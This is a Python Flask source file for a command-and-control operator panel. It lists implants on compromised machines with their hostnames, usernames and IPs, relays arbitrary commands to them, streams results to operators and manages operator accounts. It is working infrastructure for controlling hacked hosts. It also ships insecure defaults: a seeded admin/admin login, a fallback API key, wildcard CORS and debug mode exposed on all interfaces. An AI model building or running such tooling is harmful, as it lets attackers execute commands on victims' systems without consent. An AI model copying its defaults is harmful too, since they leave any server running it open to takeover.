# app.py - Flask web application for C2 server management
from flask import Flask, render_template, request, jsonify, session, redirect, url_for
from flask_socketio import SocketIO, emit, join_room, leave_room
import threading
import time
import uuid
import os
import logging
import json
import requests
from datetime import datetime
from functools import wraps
from werkzeug.security import generate_password_hash, check_password_hash
from models import db, Operator, Implant, Command, WebSession

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger('C2WebInterface')

# Initialize Flask app
app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv('DATABASE_URI', 'sqlite:///c2_database.db')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

# Initialize database
db.init_app(app)

# Initialize Socket.IO
socketio = SocketIO(app, cors_allowed_origins="*")

# Configuration
C2_SERVER_API = os.getenv('C2_SERVER_API', 'http://localhost:5001/api')
API_KEY = os.getenv('C2_API_KEY', 'your-secret-api-key')

# Create all database tables
@app.before_first_request
def create_tables():
    db.create_all()
    # Create default admin user if not exists
    if not Operator.query.filter_by(username='admin').first():
        admin = Operator(username='admin', role='admin')
        admin.set_password('admin')  # Change this default password!
        db.session.add(admin)
        db.session.commit()

# Authentication decorator
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'operator_id' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

# Operator authentication decorator
def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'operator_id' not in session:
            return redirect(url_for('login'))
        
        operator = Operator.query.get(session['operator_id'])
        if not operator or operator.role != 'admin':
            return jsonify({"error": "Admin privileges required"}), 403
            
        return f(*args, **kwargs)
    return decorated_function

# Routes
@app.route('/')
def index():
    if 'operator_id' in session:
        return redirect(url_for('dashboard'))
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        data = request.json
        username = data.get('username')
        password = data.get('password')
        
        operator = Operator.query.filter_by(username=username).first()
        
        if operator and operator.check_password(password):
            session['operator_id'] = operator.id
            
            # Create a new web session
            session_id = str(uuid.uuid4())
            web_session = WebSession(
                session_id=session_id,
                operator_id=operator.id,
                ip_address=request.remote_addr,
                user_agent=request.user_agent.string
            )
            db.session.add(web_session)
            
            # Update last login
            operator.last_login = datetime.utcnow()
            db.session.commit()
            
            return jsonify({"success": True, "session_id": session_id})
        
        return jsonify({"success": False, "error": "Invalid credentials"}), 401
    
    return render_template('login.html')

@app.route('/dashboard')
@login_required
def dashboard():
    operator = Operator.query.get(session['operator_id'])
    return render_template('dashboard.html', operator=operator.username)

@app.route('/logout')
def logout():
    if 'operator_id' in session:
        # Mark web session as inactive
        web_session = WebSession.query.filter_by(
            operator_id=session['operator_id'], 
            is_active=True
        ).order_by(WebSession.last_activity.desc()).first()
        
        if web_session:
            web_session.is_active = False
            db.session.commit()
            
        session.pop('operator_id', None)
    return redirect(url_for('login'))

# API endpoints for C2 operations
@app.route('/api/implants', methods=['GET'])
@login_required
def get_implants():
    implants = Implant.query.filter_by(is_active=True).all()
    return jsonify({"implants": [implant.to_dict() for implant in implants]})

@app.route('/api/implants/<int:implant_id>/select', methods=['POST'])
@login_required
def select_implant(implant_id):
    implant = Implant.query.get(implant_id)
    if not implant:
        return jsonify({"success": False, "error": "Invalid implant ID"}), 400
    
    # Call C2 server API to select the implant
    try:
        response = requests.post(
            f"{C2_SERVER_API}/implants/{implant.implant_id}/select",
            headers={"Authorization": f"Bearer {API_KEY}"},
            json={"operator": session['operator_id']}
        )
        
        if response.status_code == 200:
            return jsonify({"success": True})
        else:
            return jsonify({"success": False, "error": response.json().get('error', 'Unknown error')}), response.status_code
    except requests.RequestException as e:
        logger.error(f"API error: {e}")
        return jsonify({"success": False, "error": "C2 server communication error"}), 500

@app.route('/api/command', methods=['POST'])
@login_required
def execute_command():
    data = request.json
    command = data.get('command')
    implant_id = data.get('implant_id')
    
    if not command:
        return jsonify({"success": False, "error": "No command provided"}), 400
    
    implant = Implant.query.get(implant_id)
    if not implant:
        return jsonify({"success": False, "error": "Invalid implant ID"}), 400
    
    # Record who executed this command
    operator_id = session['operator_id']
    timestamp = datetime.utcnow()
    
    # Create a new command record in pending state
    cmd = Command(
        implant_id=implant.id,
        operator_id=operator_id,
        command_text=command,
        status='pending'
    )
    db.session.add(cmd)
    db.session.commit()
    
    try:
        # Execute the command via the C2 server API
        response = requests.post(
            f"{C2_SERVER_API}/implants/{implant.implant_id}/command",
            headers={"Authorization": f"Bearer {API_KEY}"},
            json={
                "command": command,
                "command_id": cmd.id,
                "operator_id": operator_id
            }
        )
        
        if response.status_code == 200:
            result = response.json()
            
            # Update the command record
            cmd.response = result.get('response', '')
            cmd.status = 'completed'
            db.session.commit()
            
            # Broadcast to all operators viewing this implant
            socketio.emit('command_executed', {
                'implant_id': implant.id,
                'command_id': cmd.id,
                'timestamp': cmd.executed_at.isoformat(),
                'operator': Operator.query.get(operator_id).username,
                'command': command,
                'response': cmd.response
            }, room=f"implant_{implant.id}")
            
            return jsonify({
                "success": True,
                "command": command,
                "response": cmd.response,
                "timestamp": cmd.executed_at.isoformat(),
                "operator": Operator.query.get(operator_id).username
            })
        else:
            # Mark command as failed
            cmd.status = 'failed'
            cmd.response = response.json().get('error', 'Unknown error')
            db.session.commit()
            
            return jsonify({
                "success": False, 
                "error": cmd.response
            }), response.status_code
            
    except requests.RequestException as e:
        logger.error(f"API error: {e}")
        # Mark command as failed
        cmd.status = 'failed'
        cmd.response = f"C2 server communication error: {str(e)}"
        db.session.commit()
        
        return jsonify({
            "success": False, 
            "error": "C2 server communication error"
        }), 500

@app.route('/api/history/<int:implant_id>', methods=['GET'])
@login_required
def get_command_history(implant_id):
    implant = Implant.query.get(implant_id)
    if not implant:
        return jsonify({"success": False, "error": "Invalid implant ID"}), 400
        
    commands = Command.query.filter_by(implant_id=implant.id).order_by(Command.executed_at.desc()).all()
    return jsonify({"history": [cmd.to_dict() for cmd in commands]})

@app.route('/api/operators', methods=['GET'])
@admin_required
def get_operators():
    operators = Operator.query.all()
    return jsonify({"operators": [op.to_dict() for op in operators]})

@app.route('/api/operators', methods=['POST'])
@admin_required
def add_operator():
    data = request.json
    username = data.get('username')
    password = data.get('password')
    role = data.get('role', 'operator')
    
    if not username or not password:
        return jsonify({"success": False, "error": "Username and password are required"}), 400
        
    if Operator.query.filter_by(username=username).first():
        return jsonify({"success": False, "error": "Operator already exists"}), 409
        
    operator = Operator(username=username, role=role)
    operator.set_password(password)
    db.session.add(operator)
    db.session.commit()
    
    return jsonify({"success": True, "username": username, "role": role})

@app.route('/api/operators/<int:operator_id>', methods=['DELETE'])
@admin_required
def delete_operator(operator_id):
    if operator_id == session['operator_id']:
        return jsonify({"success": False, "error": "Cannot delete your own account"}), 403
        
    operator = Operator.query.get(operator_id)
    if not operator:
        return jsonify({"success": False, "error": "Operator not found"}), 404
        
    if operator.username == 'admin':
        return jsonify({"success": False, "error": "Cannot delete admin account"}), 403
        
    db.session.delete(operator)
    db.session.commit()
    return jsonify({"success": True})

# Webhook endpoint for C2 server to report new implants
@app.route('/api/webhook/implant', methods=['POST'])
def implant_webhook():
    # Verify API key
    auth_header = request.headers.get('Authorization')
    if not auth_header or not auth_header.startswith('Bearer ') or auth_header[7:] != API_KEY:
        return jsonify({"error": "Unauthorized"}), 401
    
    data = request.json
    
    # Check if implant already exists
    implant = Implant.query.filter_by(implant_id=data['implant_id']).first()
    
    if implant:
        # Update existing implant
        implant.hostname = data.get('hostname', implant.hostname)
        implant.username = data.get('username', implant.username)
        implant.ip_address = data.get('ip_address', implant.ip_address)
        implant.port = data.get('port', implant.port)
        implant.platform = data.get('platform', implant.platform)
        implant.architecture = data.get('architecture', implant.architecture)
        implant.last_seen = datetime.utcnow()
        implant.is_active = True
    else:
        # Create new implant
        implant = Implant(
            implant_id=data['implant_id'],
            hostname=data.get('hostname'),
            username=data.get('username'),
            ip_address=data.get('ip_address'),
            port=data.get('port'),
            platform=data.get('platform'),
            architecture=data.get('architecture')
        )
        db.session.add(implant)
    
    db.session.commit()
    
    # Notify all operators about the new/updated implant
    socketio.emit('implant_update', implant.to_dict())
    
    return jsonify({"success": True})

# Webhook endpoint for C2 server to update command status
@app.route('/api/webhook/command', methods=['POST'])
def command_webhook():
    # Verify API key
    auth_header = request.headers.get('Authorization')
    if not auth_header or not auth_header.startswith('Bearer ') or auth_header[7:] != API_KEY:
        return jsonify({"error": "Unauthorized"}), 401
    
    data = request.json
    command_id = data.get('command_id')
    
    command = Command.query.get(command_id)
    if not command:
        return jsonify({"error": "Command not found"}), 404
    
    # Update command with response from C2 server
    command.response = data.get('response', '')
    command.status = data.get('status', 'completed')
    db.session.commit()
    
    # Notify operators about the command update
    socketio.emit('command_updated', command.to_dict(), room=f"implant_{command.implant_id}")
    
    return jsonify({"success": True})

# Socket.IO events
@socketio.on('connect')
def handle_connect():
    if 'operator_id' not in session:
        return False
    logger.info(f"Operator connected: {session['operator_id']}")

@socketio.on('join_implant_room')
def on_join(data):
    implant_id = data['implant_id']
    room = f"implant_{implant_id}"
    join_room(room)
    logger.info(f"Operator {session['operator_id']} joined room {room}")

@socketio.on('leave_implant_room')
def on_leave(data):
    implant_id = data['implant_id']
    room = f"implant_{implant_id}"
    leave_room(room)
    logger.info(f"Operator {session['operator_id']} left room {room}")

if __name__ == '__main__':
    # Start the Flask app with Socket.IO
    socketio.run(app, host='0.0.0.0', port=5000, debug=True, use_reloader=False)